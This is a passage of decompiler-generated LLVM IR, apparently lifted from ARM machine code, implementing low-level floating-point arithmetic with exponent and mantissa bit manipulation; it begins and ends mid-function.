  %v1_1d25c = and i32 %v2_1d22c, -2147483648
  store i32 %v1_1d25c, i32* %r1.global-to-local, align 4
  %v3_1d260 = icmp uge i32 %v5_1d254, %v5_1d248
  %v9_1d260 = icmp eq i32 %v5_1d254, %v5_1d248
  br i1 %v9_1d260, label %bb94, label %bb95

bb94:                                             ; preds = %dec_label_pc_1d23c
  %v4_1d264 = icmp uge i32 %v3_1d258, %v3_1d24c
  br label %bb95

bb95:                                             ; preds = %dec_label_pc_1d23c, %bb94
  %v1_1d268 = phi i1 [ %v3_1d260, %dec_label_pc_1d23c ], [ %v4_1d264, %bb94 ]
  %v2_1d268 = add nsw i32 %v2_1d228, 253
  %v3_1d268 = zext i1 %v1_1d268 to i32
  %v4_1d268 = add nsw i32 %v2_1d268, %v3_1d268
  %v8_1d268 = icmp ule i32 %v4_1d268, %v2_1d228
  %v9_1d268 = icmp ugt i32 %v2_1d228, -254
  %v10_1d268 = select i1 %v1_1d268, i1 %v8_1d268, i1 %v9_1d268
  %v1_1d26c = add nsw i32 %v4_1d268, 768
  store i32 %v1_1d26c, i32* %r4.global-to-local, align 4
  br i1 %v10_1d268, label %dec_label_pc_1d27c, label %dec_label_pc_1d274

dec_label_pc_1d274:                               ; preds = %bb95
  %v3_1d274 = udiv i32 %v5_1d248, 2
  store i32 %v3_1d274, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1d27c

dec_label_pc_1d27c:                               ; preds = %bb95, %dec_label_pc_1d274
  %v0_1d284 = phi i32 [ %v5_1d248, %bb95 ], [ %v3_1d274, %dec_label_pc_1d274 ]
  %v0_1d288 = phi i32 [ %v3_1d24c, %bb95 ], [ 0, %dec_label_pc_1d274 ]
  %v2_1d27c = sub i32 %v3_1d258, %v0_1d288
  store i32 %v2_1d27c, i32* %r6.global-to-local, align 4
  %v3_1d27c = icmp uge i32 %v3_1d258, %v0_1d288
  %v3_1d280 = icmp eq i1 %v3_1d27c, false
  %v4_1d280 = sub nsw i32 %v5_1d254, %v0_1d284
  %v6_1d280 = sext i1 %v3_1d280 to i32
  %v7_1d280 = add nsw i32 %v6_1d280, %v4_1d280
  store i32 %v7_1d280, i32* %r5.global-to-local, align 4
  %v3_1d284 = udiv i32 %v0_1d284, 2
  store i32 %v3_1d284, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1d294.outer

dec_label_pc_1d294.outer:                         ; preds = %dec_label_pc_1d32c, %dec_label_pc_1d27c
  %v1_1d340.ph = phi i32 [ %v2_1d32c, %dec_label_pc_1d32c ], [ %v1_1d25c, %dec_label_pc_1d27c ]
  %v0_1d298.ph = phi i32 [ %v5_1d308, %dec_label_pc_1d32c ], [ %v7_1d280, %dec_label_pc_1d27c ]
  %v1_1d29c.ph = phi i32 [ %v3_1d30c, %dec_label_pc_1d32c ], [ %v2_1d27c, %dec_label_pc_1d27c ]
  %v5_1d31417.ph = phi i32 [ %v5_1d314, %dec_label_pc_1d32c ], [ %v3_1d284, %dec_label_pc_1d27c ]
  %v3_1d31813.ph = phi i32 [ %v3_1d318, %dec_label_pc_1d32c ], [ 0, %dec_label_pc_1d27c ]
  %storemerge133 = phi i32 [ 0, %dec_label_pc_1d32c ], [ 1048576, %dec_label_pc_1d27c ]
  %storemerge = phi i32 [ -2147483648, %dec_label_pc_1d32c ], [ 524288, %dec_label_pc_1d27c ]
  store i32 %storemerge133, i32* %r0.global-to-local, align 4
  store i32 %storemerge, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1d294

dec_label_pc_1d294:                               ; preds = %dec_label_pc_1d294.outer, %dec_label_pc_1d304
  %v1_1d2f859 = phi i32 [ %v2_1d340, %dec_label_pc_1d304 ], [ %storemerge133, %dec_label_pc_1d294.outer ]
  %v1_1d2a4 = phi i32 [ %v1_1d2a432, %dec_label_pc_1d304 ], [ %storemerge133, %dec_label_pc_1d294.outer ]
  %v1_1d2c041 = phi i32 [ %v1_1d2c043, %dec_label_pc_1d304 ], [ %storemerge133, %dec_label_pc_1d294.outer ]
  %v1_1d2dc50 = phi i32 [ %v1_1d2dc52, %dec_label_pc_1d304 ], [ %storemerge133, %dec_label_pc_1d294.outer ]
  %v0_1d31c = phi i32 [ %v3_1d31c, %dec_label_pc_1d304 ], [ %storemerge, %dec_label_pc_1d294.outer ]
  %v0_1d298 = phi i32 [ %v5_1d308, %dec_label_pc_1d304 ], [ %v0_1d298.ph, %dec_label_pc_1d294.outer ]
  %v1_1d29c = phi i32 [ %v3_1d30c, %dec_label_pc_1d304 ], [ %v1_1d29c.ph, %dec_label_pc_1d294.outer ]
  %v5_1d31417 = phi i32 [ %v5_1d314, %dec_label_pc_1d304 ], [ %v5_1d31417.ph, %dec_label_pc_1d294.outer ]
  %v3_1d31813 = phi i32 [ %v3_1d318, %dec_label_pc_1d304 ], [ %v3_1d31813.ph, %dec_label_pc_1d294.outer ]
  %v3_1d294 = icmp uge i32 %v1_1d29c, %v3_1d31813
  %v3_1d298 = icmp eq i1 %v3_1d294, false
  %v4_1d298 = sub i32 %v0_1d298, %v5_1d31417
  %v6_1d298 = sext i1 %v3_1d298 to i32
  %v7_1d298 = add i32 %v6_1d298, %v4_1d298
  %v8_1d298 = zext i1 %v3_1d298 to i32
  %v9_1d298 = sub i32 %v7_1d298, %v8_1d298
  %v10_1d298 = icmp ult i32 %v0_1d298, %v9_1d298
  %v11_1d298 = icmp ne i32 %v5_1d31417, -1
  %v12_1d298 = or i1 %v11_1d298, %v10_1d298
  %v13_1d298 = icmp ult i32 %v0_1d298, %v5_1d31417
  %v14_1d298 = select i1 %v3_1d298, i1 %v12_1d298, i1 %v13_1d298
  br i1 %v14_1d298, label %.thread4, label %bb96

bb96:                                             ; preds = %dec_label_pc_1d294
  %v3_1d29c = sub i32 %v1_1d29c, %v3_1d31813
  store i32 %v3_1d29c, i32* %r6.global-to-local, align 4
  store i32 %v7_1d298, i32* %r5.global-to-local, align 4
  %v3_1d2a4 = or i32 %v1_1d2a4, %v0_1d31c
  store i32 %v3_1d2a4, i32* %r0.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_1d294, %bb96
  %v1_1d2f858 = phi i32 [ %v1_1d2f859, %dec_label_pc_1d294 ], [ %v3_1d2a4, %bb96 ]
  %v1_1d2a435 = phi i32 [ %v1_1d2a4, %dec_label_pc_1d294 ], [ %v3_1d2a4, %bb96 ]
  %v1_1d2c0 = phi i32 [ %v1_1d2c041, %dec_label_pc_1d294 ], [ %v3_1d2a4, %bb96 ]
  %v1_1d2dc49 = phi i32 [ %v1_1d2dc50, %dec_label_pc_1d294 ], [ %v3_1d2a4, %bb96 ]
  %v0_1d2b4 = phi i32 [ %v0_1d298, %dec_label_pc_1d294 ], [ %v7_1d298, %bb96 ]
  %v1_1d2b8 = phi i32 [ %v1_1d29c, %dec_label_pc_1d294 ], [ %v3_1d29c, %bb96 ]
  %v1_1d2a8 = urem i32 %v5_1d31417, 2
  %v2_1d2a8 = icmp ne i32 %v1_1d2a8, 0
  %v3_1d2a8 = udiv i32 %v5_1d31417, 2
  %v3_1d2ac = zext i1 %v2_1d2a8 to i32
  %v6_1d2ac = zext i32 %v3_1d31813 to i64
  %v7_1d2ac = sub i32 33, %v3_1d31813
  %v8_1d2ac = zext i32 %v7_1d2ac to i64
  %v9_1d2ac = shl i64 %v6_1d2ac, %v8_1d2ac
  %v10_1d2ac = sub i32 32, %v3_1d31813
  %v11_1d2ac = shl i32 %v3_1d2ac, %v10_1d2ac
  %v12_1d2ac = zext i32 %v11_1d2ac to i64
  %v14_1d2ac = or i64 %v12_1d2ac, %v9_1d2ac
  %v15_1d2ac = trunc i64 %v14_1d2ac to i32
  %v3_1d2b0 = icmp uge i32 %v1_1d2b8, %v15_1d2ac
  %v3_1d2b4 = icmp eq i1 %v3_1d2b0, false
  %v4_1d2b4 = sub i32 %v0_1d2b4, %v3_1d2a8
  %v6_1d2b4 = sext i1 %v3_1d2b4 to i32
  %v7_1d2b4 = add i32 %v6_1d2b4, %v4_1d2b4
  %v13_1d2b4 = icmp ult i32 %v0_1d2b4, %v3_1d2a8
  %v14_1d2b4 = or i1 %v13_1d2b4, %v3_1d2b4
  br i1 %v14_1d2b4, label %.thread6, label %bb97

bb97:                                             ; preds = %.thread4
  %v3_1d2b8 = sub i32 %v1_1d2b8, %v15_1d2ac
  store i32 %v3_1d2b8, i32* %r6.global-to-local, align 4
  store i32 %v7_1d2b4, i32* %r5.global-to-local, align 4
  %v5_1d2c0 = udiv i32 %v0_1d31c, 2
  %v6_1d2c0 = or i32 %v1_1d2c0, %v5_1d2c0
  store i32 %v6_1d2c0, i32* %r0.global-to-local, align 4
  br label %.thread6

.thread6:                                         ; preds = %.thread4, %bb97
  %v1_1d2f857 = phi i32 [ %v1_1d2f858, %.thread4 ], [ %v6_1d2c0, %bb97 ]
  %v1_1d2a434 = phi i32 [ %v1_1d2a435, %.thread4 ], [ %v6_1d2c0, %bb97 ]
  %v1_1d2c045 = phi i32 [ %v1_1d2c0, %.thread4 ], [ %v6_1d2c0, %bb97 ]
  %v1_1d2dc = phi i32 [ %v1_1d2dc49, %.thread4 ], [ %v6_1d2c0, %bb97 ]
  %v0_1d2d0 = phi i32 [ %v0_1d2b4, %.thread4 ], [ %v7_1d2b4, %bb97 ]
  %v1_1d2d4 = phi i32 [ %v1_1d2b8, %.thread4 ], [ %v3_1d2b8, %bb97 ]
  %v1_1d2c4 = urem i32 %v3_1d2a8, 2
  %v2_1d2c4 = icmp ne i32 %v1_1d2c4, 0
  %v3_1d2c4 = udiv i32 %v5_1d31417, 4
  %v3_1d2c8 = zext i1 %v2_1d2c4 to i32
  %v6_1d2c8 = and i64 %v14_1d2ac, 4294967295
  %v7_1d2c8 = sub i32 33, %v15_1d2ac
  %v8_1d2c8 = zext i32 %v7_1d2c8 to i64
  %v9_1d2c8 = shl i64 %v6_1d2c8, %v8_1d2c8
  %v10_1d2c8 = sub i32 32, %v15_1d2ac
  %v11_1d2c8 = shl i32 %v3_1d2c8, %v10_1d2c8
  %v12_1d2c8 = zext i32 %v11_1d2c8 to i64
  %v14_1d2c8 = or i64 %v12_1d2c8, %v9_1d2c8
  %v15_1d2c8 = trunc i64 %v14_1d2c8 to i32
  %v3_1d2cc = icmp uge i32 %v1_1d2d4, %v15_1d2c8
  %v3_1d2d0 = icmp eq i1 %v3_1d2cc, false
  %v4_1d2d0 = sub i32 %v0_1d2d0, %v3_1d2c4
  %v6_1d2d0 = sext i1 %v3_1d2d0 to i32
  %v7_1d2d0 = add i32 %v6_1d2d0, %v4_1d2d0
  %v13_1d2d0 = icmp ult i32 %v0_1d2d0, %v3_1d2c4
  %v14_1d2d0 = or i1 %v13_1d2d0, %v3_1d2d0
  br i1 %v14_1d2d0, label %.thread8, label %bb98

bb98:                                             ; preds = %.thread6
  %v3_1d2d4 = sub i32 %v1_1d2d4, %v15_1d2c8
  store i32 %v3_1d2d4, i32* %r6.global-to-local, align 4
  store i32 %v7_1d2d0, i32* %r5.global-to-local, align 4
  %v5_1d2dc = udiv i32 %v0_1d31c, 4
  %v6_1d2dc = or i32 %v1_1d2dc, %v5_1d2dc
  store i32 %v6_1d2dc, i32* %r0.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %.thread6, %bb98
  %v1_1d2f8 = phi i32 [ %v1_1d2f857, %.thread6 ], [ %v6_1d2dc, %bb98 ]
  %v1_1d2a433 = phi i32 [ %v1_1d2a434, %.thread6 ], [ %v6_1d2dc, %bb98 ]
  %v1_1d2c044 = phi i32 [ %v1_1d2c045, %.thread6 ], [ %v6_1d2dc, %bb98 ]
  %v1_1d2dc53 = phi i32 [ %v1_1d2dc, %.thread6 ], [ %v6_1d2dc, %bb98 ]
  %v0_1d2ec = phi i32 [ %v0_1d2d0, %.thread6 ], [ %v7_1d2d0, %bb98 ]
  %v1_1d2f0 = phi i32 [ %v1_1d2d4, %.thread6 ], [ %v3_1d2d4, %bb98 ]
  %v1_1d2e0 = urem i32 %v3_1d2c4, 2
  %v2_1d2e0 = icmp ne i32 %v1_1d2e0, 0
  %v3_1d2e0 = udiv i32 %v5_1d31417, 8
  %v3_1d2e4 = zext i1 %v2_1d2e0 to i32
  %v6_1d2e4 = and i64 %v14_1d2c8, 4294967295
  %v7_1d2e4 = sub i32 33, %v15_1d2c8
  %v8_1d2e4 = zext i32 %v7_1d2e4 to i64
  %v9_1d2e4 = shl i64 %v6_1d2e4, %v8_1d2e4
  %v10_1d2e4 = sub i32 32, %v15_1d2c8
  %v11_1d2e4 = shl i32 %v3_1d2e4, %v10_1d2e4
  %v12_1d2e4 = zext i32 %v11_1d2e4 to i64
  %v14_1d2e4 = or i64 %v12_1d2e4, %v9_1d2e4
  %v15_1d2e4 = trunc i64 %v14_1d2e4 to i32
  %v3_1d2e8 = icmp uge i32 %v1_1d2f0, %v15_1d2e4
  %v3_1d2ec = icmp eq i1 %v3_1d2e8, false
  %v4_1d2ec = sub i32 %v0_1d2ec, %v3_1d2e0
  %v6_1d2ec = sext i1 %v3_1d2ec to i32
  %v7_1d2ec = add i32 %v6_1d2ec, %v4_1d2ec
  %v13_1d2ec = icmp ult i32 %v0_1d2ec, %v3_1d2e0
  %v14_1d2ec = or i1 %v13_1d2ec, %v3_1d2ec
  br i1 %v14_1d2ec, label %.thread10, label %bb100

bb100:                                            ; preds = %.thread8
  %v3_1d2f0 = sub i32 %v1_1d2f0, %v15_1d2e4
  store i32 %v3_1d2f0, i32* %r6.global-to-local, align 4
  store i32 %v7_1d2ec, i32* %r5.global-to-local, align 4
  %v5_1d2f8 = udiv i32 %v0_1d31c, 8
  %v6_1d2f8 = or i32 %v1_1d2f8, %v5_1d2f8
  store i32 %v6_1d2f8, i32* %r0.global-to-local, align 4
  br label %.thread10

.thread10:                                        ; preds = %.thread8, %bb100
  %v1_1d308 = phi i32 [ %v1_1d2f0, %.thread8 ], [ %v3_1d2f0, %bb100 ]
  %v0_1d304 = phi i32 [ %v0_1d2ec, %.thread8 ], [ %v7_1d2ec, %bb100 ]
  %v2_1d340 = phi i32 [ %v1_1d2f8, %.thread8 ], [ %v6_1d2f8, %bb100 ]
  %v1_1d2a432 = phi i32 [ %v1_1d2a433, %.thread8 ], [ %v6_1d2f8, %bb100 ]
  %v1_1d2c043 = phi i32 [ %v1_1d2c044, %.thread8 ], [ %v6_1d2f8, %bb100 ]
  %v1_1d2dc52 = phi i32 [ %v1_1d2dc53, %.thread8 ], [ %v6_1d2f8, %bb100 ]
  %v2_1d2fc = or i32 %v0_1d304, %v1_1d308
  %v4_1d2fc = icmp eq i32 %v2_1d2fc, 0
  br i1 %v4_1d2fc, label %dec_label_pc_1d33c, label %dec_label_pc_1d304

dec_label_pc_1d304:                               ; preds = %.thread10
  %v3_1d304 = mul i32 %v0_1d304, 16
  %v4_1d308 = udiv i32 %v1_1d308, 268435456
  %v5_1d308 = or i32 %v3_1d304, %v4_1d308
  store i32 %v5_1d308, i32* %r5.global-to-local, align 4
  %v3_1d30c = mul i32 %v1_1d308, 16
  store i32 %v3_1d30c, i32* %r6.global-to-local, align 4
  %v3_1d310 = mul nuw i32 %v3_1d2e0, 8
  %v4_1d314 = udiv i32 %v15_1d2e4, 536870912
  %v5_1d314 = or i32 %v4_1d314, %v3_1d310
  %v3_1d318 = mul i32 %v15_1d2e4, 8
  %v3_1d31c = udiv i32 %v0_1d31c, 16
  store i32 %v3_1d31c, i32* %ip.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1d31c, 16
  br i1 %tmp, label %dec_label_pc_1d324, label %dec_label_pc_1d294

dec_label_pc_1d324:                               ; preds = %dec_label_pc_1d304
  %v1_1d324 = and i32 %v1_1d340.ph, 1048576
  %v2_1d324 = icmp eq i32 %v1_1d324, 0
  br i1 %v2_1d324, label %dec_label_pc_1d32c, label %.thread11.loopexit

dec_label_pc_1d32c:                               ; preds = %dec_label_pc_1d324
  %v2_1d32c = or i32 %v2_1d340, %v1_1d340.ph
  store i32 %v2_1d32c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1d294.outer

dec_label_pc_1d33c:                               ; preds = %.thread10
  store i32 %v15_1d2e4, i32* %r2.global-to-local, align 4
  store i32 %v3_1d2e0, i32* %r3.global-to-local, align 4
  %v1_1d33c = and i32 %v1_1d340.ph, 1048576
  %v2_1d33c = icmp eq i32 %v1_1d33c, 0
  br i1 %v2_1d33c, label %bb101, label %.thread11

bb101:                                            ; preds = %dec_label_pc_1d33c
  %v3_1d340 = or i32 %v2_1d340, %v1_1d340.ph
  store i32 %v3_1d340, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread11

.thread11.loopexit:                               ; preds = %dec_label_pc_1d324
  store i32 %v3_1d318, i32* %r2.global-to-local, align 4
  store i32 %v5_1d314, i32* %r3.global-to-local, align 4
  br label %.thread11

.thread11:                                        ; preds = %.thread11.loopexit, %dec_label_pc_1d33c, %bb101
  %v1_1d348 = add nsw i32 %v4_1d268, 515
  store i32 %v1_1d348, i32* %ip.global-to-local, align 4
  %v2_1d348 = icmp ugt i32 %v1_1d26c, 252
  %v7_1d348 = icmp eq i32 %v1_1d26c, 253
  %v2_1d34c = xor i1 %v7_1d348, true
  %v3_1d34c = and i1 %v2_1d348, %v2_1d34c
  br i1 %v3_1d34c, label %bb102, label %bb103

bb102:                                            ; preds = %.thread11
  %v6_1d34c = icmp ugt i32 %v1_1d348, 1791
  %v11_1d34c = icmp eq i32 %v1_1d348, 1792
  br label %bb103

bb103:                                            ; preds = %.thread11, %bb102
  %v1_1d350 = phi i1 [ %v7_1d348, %.thread11 ], [ %v11_1d34c, %bb102 ]
  %v0_1d350 = phi i1 [ %v2_1d348, %.thread11 ], [ %v6_1d34c, %bb102 ]
  %v2_1d350 = xor i1 %v1_1d350, true
  %v3_1d350 = and i1 %v0_1d350, %v2_1d350
  call void @__pseudo_cond_branch(i1 %v3_1d350, i32 ptrtoint (i32* @global_var_1d064.1394 to i32))
  %v0_1d354 = load i32, i32* %r5.global-to-local, align 4
  %v1_1d354 = load i32, i32* %r3.global-to-local, align 4
  %v2_1d354 = sub i32 %v0_1d354, %v1_1d354
  store i32 %v2_1d354, i32* %ip.global-to-local, align 4
  %v3_1d354 = icmp uge i32 %v0_1d354, %v1_1d354
  %v9_1d354 = icmp eq i32 %v0_1d354, %v1_1d354
  br i1 %v9_1d354, label %bb104, label %.thread12

bb104:                                            ; preds = %bb103
  %v1_1d358 = load i32, i32* %r6.global-to-local, align 4
  %v2_1d358 = load i32, i32* %r2.global-to-local, align 4
  %v3_1d358 = sub i32 %v1_1d358, %v2_1d358
  store i32 %v3_1d358, i32* %ip.global-to-local, align 4
  %v4_1d358 = icmp uge i32 %v1_1d358, %v2_1d358
  %v10_1d358 = icmp eq i32 %v1_1d358, %v2_1d358
  br i1 %v10_1d358, label %bb105, label %.thread12

bb105:                                            ; preds = %bb104
  %v1_1d35c = load i32, i32* %r0.global-to-local, align 4
  %v2_1d35c = urem i32 %v1_1d35c, 2
  %v3_1d35c = icmp ne i32 %v2_1d35c, 0
  %v4_1d35c = udiv i32 %v1_1d35c, 2
  store i32 %v4_1d35c, i32* %ip.global-to-local, align 4
  br label %.thread12

.thread12:                                        ; preds = %bb103, %bb104, %bb105
  %v1_1d360 = phi i1 [ %v3_1d354, %bb103 ], [ %v4_1d358, %bb104 ], [ %v3_1d35c, %bb105 ]
  %v0_1d360 = load i32, i32* %r0.global-to-local, align 4
  %v2_1d360 = zext i1 %v1_1d360 to i32
  %v3_1d360 = add i32 %v2_1d360, %v0_1d360
  store i32 %v3_1d360, i32* %r0.global-to-local, align 4
  %v0_1d364 = load i32, i32* %r1.global-to-local, align 4
  %v1_1d364 = load i32, i32* %r4.global-to-local, align 4
  %v2_1d364 = and i32 %v1_1d364, 4096
  %v3_1d364 = icmp ne i32 %v2_1d364, 0
  %v4_1d364 = mul i32 %v1_1d364, 1048576
  %v6_1d364 = add i32 %v4_1d364, %v0_1d364
  %v7_1d364 = zext i1 %v3_1d364 to i32
  %v8_1d364 = add i32 %v7_1d364, %v6_1d364
  store i32 %v8_1d364, i32* %r1.global-to-local, align 4
  %v2_1d368 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1d368, i32* %r4.global-to-local, align 4
  store i32 %v6_1d208, i32* %r5.global-to-local, align 4
  store i32 %v9_1d208, i32* %r6.global-to-local, align 4
  ret i32 %v3_1d360

dec_label_pc_1d370:                               ; preds = %dec_label_pc_1d228
  %v1_1d370 = and i32 %v2_1d22c, -2147483648
  %v4_1d374 = urem i32 %v1_1d214, 1048576
  %v5_1d374 = or i32 %v1_1d370, %v4_1d374
  store i32 %v5_1d374, i32* %r1.global-to-local, align 4
  %v6_1d378 = add nsw i32 %v2_1d228, 1023
  store i32 %v6_1d378, i32* %r4.global-to-local, align 4
  %v8_1d378 = sub nsw i32 0, %v2_1d228
  %v9_1d378 = and i32 %v6_1d378, %v8_1d378
  %v11_1d378 = icmp slt i32 %v2_1d228, -1023
  %v12_1d378 = icmp eq i32 %v6_1d378, 0
  %v7_1d37c = icmp sgt i32 %v2_1d228, -1023
  br i1 %v7_1d37c, label %bb106, label %bb107

bb106:                                            ; preds = %dec_label_pc_1d370
  %v10_1d37c = sub nsw i32 1024, %v2_1d228
  store i32 %v10_1d37c, i32* %r5.global-to-local, align 4
  %v14_1d37c = and i32 %v10_1d37c, %v6_1d378
  %v16_1d37c = icmp slt i32 %v10_1d37c, 0
  %v17_1d37c = icmp eq i32 %v6_1d378, 2047
  br label %bb107

bb107:                                            ; preds = %dec_label_pc_1d370, %bb106
  %v3_1d388.in = phi i32 [ %v9_1d378, %dec_label_pc_1d370 ], [ %v14_1d37c, %bb106 ]
  %v2_1d388 = phi i1 [ %v11_1d378, %dec_label_pc_1d370 ], [ %v16_1d37c, %bb106 ]
  %v1_1d388 = phi i1 [ %v12_1d378, %dec_label_pc_1d370 ], [ %v17_1d37c, %bb106 ]
  %v3_1d388 = icmp slt i32 %v3_1d388.in, 0
  %v3_1d380 = xor i1 %v3_1d388, %v2_1d388
  %v4_1d380 = or i1 %v1_1d388, %v3_1d380
  br i1 %v4_1d380, label %.thread, label %bb108

bb108:                                            ; preds = %bb107
  %v9_1d38084 = mul i32 %v6_1d378, 1048576
  %v10_1d38085 = or i32 %v9_1d38084, %v5_1d374
  store i32 %v10_1d38085, i32* %r1.global-to-local, align 4
  store i32 %v3_1d208, i32* %r4.global-to-local, align 4
  store i32 %v6_1d208, i32* %r5.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %bb107, %bb108
  %v0_1d388 = phi i32 [ %v12_1d208, %bb108 ], [ %v1_1d370, %bb107 ]
  %v6_1d388 = xor i1 %v4_1d380, true
  call void @__pseudo_cond_branch(i1 %v6_1d388, i32 %v0_1d388)
  %v0_1d38c = load i32, i32* %r1.global-to-local, align 4
  %v1_1d38c = or i32 %v0_1d38c, 1048576
  store i32 %v1_1d38c, i32* @r1, align 4
  %v0_1d394 = load i32, i32* %r4.global-to-local, align 4
  %v1_1d394 = add i32 %v0_1d394, -1
  store i32 %v1_1d394, i32* @r4, align 4
  %v3_1d394 = sub i32 0, %v0_1d394
  %v4_1d394 = and i32 %v0_1d394, %v3_1d394
  %v5_1d394 = icmp slt i32 %v4_1d394, 0
  store i1 %v5_1d394, i1* @cpsr_v, align 1
  %v6_1d394 = icmp slt i32 %v1_1d394, 0
  store i1 %v6_1d394, i1* @cpsr_n, align 1
  %v7_1d394 = icmp eq i32 %v0_1d394, 1
  store i1 %v7_1d394, i1* @cpsr_z, align 1
  %v0_1d398 = call i32 @function_1d064()
  store i32 %v0_1d398, i32* @r0, align 4
  %v0_1d3a0 = call i32 @function_1d064()
  store i32 %v0_1d3a0, i32* @r0, align 4
  %v0_1d3a4.pre = load i32, i32* %ip.global-to-local, align 4
  %v0_1d3a8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1d3a4

dec_label_pc_1d3a4:                               ; preds = %.thread1, %.thread2, %bb91, %.thread
  %v4_1d3a4.pre-phi = phi i32 [ %v5_1d218, %.thread1 ], [ %.pre145.pre-phi, %.thread2 ], [ %v5_1d218, %bb91 ], [ %v5_1d218, %.thread ]
  %v0_1d3a8 = phi i32 [ %v5_1d214, %.thread1 ], [ %v5_1d214, %.thread2 ], [ %v5_1d214, %bb91 ], [ %v0_1d3a8.pre, %.thread ]
  %v2_1d3ac = phi i32 [ 2047, %.thread1 ], [ 2047, %.thread2 ], [ 2047, %bb91 ], [ %v0_1d3a4.pre, %.thread ]
  %v5_1d3a4 = and i32 %v2_1d3ac, %v4_1d3a4.pre-phi
  store i32 %v5_1d3a4, i32* @r5, align 4
  %v4_1d3a8 = icmp eq i32 %v2_1d3ac, %v0_1d3a8
  br i1 %v4_1d3a8, label %bb109, label %bb110

bb109:                                            ; preds = %dec_label_pc_1d3a4
  %v5_1d3ac = icmp eq i32 %v5_1d3a4, %v2_1d3ac
  br label %bb110

bb110:                                            ; preds = %dec_label_pc_1d3a4, %bb109
  %v0_1d3b0 = phi i1 [ false, %dec_label_pc_1d3a4 ], [ %v5_1d3ac, %bb109 ]
  call void @__pseudo_cond_branch(i1 %v0_1d3b0, i32 ptrtoint (i32* @global_var_1d1f8.1396 to i32))
  %v0_1d3b4 = load i32, i32* @r4, align 4
  %v1_1d3b4 = load i32, i32* %ip.global-to-local, align 4
  %v4_1d3b4 = icmp eq i32 %v1_1d3b4, %v0_1d3b4
  br i1 %v4_1d3b4, label %dec_label_pc_1d3bc, label %dec_label_pc_1d3d8

dec_label_pc_1d3bc:                               ; preds = %bb110
  %v0_1d3bc = load i32, i32* @r0, align 4
  %v1_1d3bc = load i32, i32* @r1, align 4
  %v4_1d3bc = mul i32 %v1_1d3bc, 4096
  %v5_1d3bc = or i32 %v4_1d3bc, %v0_1d3bc
  store i32 %v5_1d3bc, i32* %r4.global-to-local, align 4
  %v1_1d3c0 = icmp ne i32 %v5_1d3bc, 0
  call void @__pseudo_cond_branch(i1 %v1_1d3c0, i32 ptrtoint (i32* @global_var_1d1f8.1396 to i32))
  %v0_1d3c4 = load i32, i32* @r5, align 4
  %v1_1d3c4 = load i32, i32* %ip.global-to-local, align 4
  %v1_1d3c8 = icmp ne i32 %v1_1d3c4, %v0_1d3c4
  call void @__pseudo_cond_branch(i1 %v1_1d3c8, i32 ptrtoint (i32* @global_var_1d1dc.1397 to i32))
  store i32 %arg3, i32* @r0, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v2_1d3d4 = call i32 @function_1d1f8(i32 %arg3, i32 %arg4)
  store i32 %v2_1d3d4, i32* @r0, align 4
  %v1_1d3d8.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1d3d8

dec_label_pc_1d3d8:                               ; preds = %bb110, %dec_label_pc_1d3bc
  %v1_1d3d8 = phi i32 [ %v1_1d3b4, %bb110 ], [ %v1_1d3d8.pre, %dec_label_pc_1d3bc ]
  %v0_1d3d8 = load i32, i32* @r5, align 4
  %v4_1d3d8 = icmp eq i32 %v0_1d3d8, %v1_1d3d8
  br i1 %v4_1d3d8, label %dec_label_pc_1d3e0, label %dec_label_pc_1d3d8.dec_label_pc_1d3f4_crit_edge

dec_label_pc_1d3d8.dec_label_pc_1d3f4_crit_edge:  ; preds = %dec_label_pc_1d3d8
  %v0_1d3f4.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1d3f4

dec_label_pc_1d3e0:                               ; preds = %dec_label_pc_1d3d8
  %v4_1d3e0 = mul i32 %arg4, 4096
  %v5_1d3e0 = or i32 %v4_1d3e0, %arg3
  store i32 %v5_1d3e0, i32* %r5.global-to-local, align 4
  %v7_1d3e0 = icmp eq i32 %v5_1d3e0, 0
  call void @__pseudo_cond_branch(i1 %v7_1d3e0, i32 ptrtoint (i32* @global_var_1d18c.1398 to i32))
  store i32 %arg3, i32* @r0, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v2_1d3f0 = call i32 @function_1d1f8(i32 %arg3, i32 %arg4)
  store i32 %v2_1d3f0, i32* @r0, align 4
  br label %dec_label_pc_1d3f4

dec_label_pc_1d3f4:                               ; preds = %dec_label_pc_1d3d8.dec_label_pc_1d3f4_crit_edge, %dec_label_pc_1d3e0
  %v0_1d3f4 = phi i32 [ %v0_1d3f4.pre, %dec_label_pc_1d3d8.dec_label_pc_1d3f4_crit_edge ], [ %v2_1d3f0, %dec_label_pc_1d3e0 ]
  %v1_1d3f4 = load i32, i32* @r1, align 4
  %v3_1d3f4 = mul i32 %v1_1d3f4, 2
  %v4_1d3f4 = or i32 %v3_1d3f4, %v0_1d3f4
  store i32 %v4_1d3f4, i32* %r6.global-to-local, align 4
  %v6_1d3f4 = icmp eq i32 %v4_1d3f4, 0
  br i1 %v6_1d3f4, label %dec_label_pc_1d3f4._crit_edge, label %bb111

dec_label_pc_1d3f4._crit_edge:                    ; preds = %dec_label_pc_1d3f4
  %.pre = mul i32 %arg4, 2
  %.pre80 = or i32 %.pre, %arg3
  br label %bb112

bb111:                                            ; preds = %dec_label_pc_1d3f4
  %v4_1d3f8 = mul i32 %arg4, 2
  %v5_1d3f8 = or i32 %v4_1d3f8, %arg3
  store i32 %v5_1d3f8, i32* %r6.global-to-local, align 4
  %phitmp = icmp ne i32 %v5_1d3f8, 0
  br label %bb112

bb112:                                            ; preds = %dec_label_pc_1d3f4._crit_edge, %bb111
  %v4_1d408.pre-phi = phi i32 [ %.pre80, %dec_label_pc_1d3f4._crit_edge ], [ %v5_1d3f8, %bb111 ]
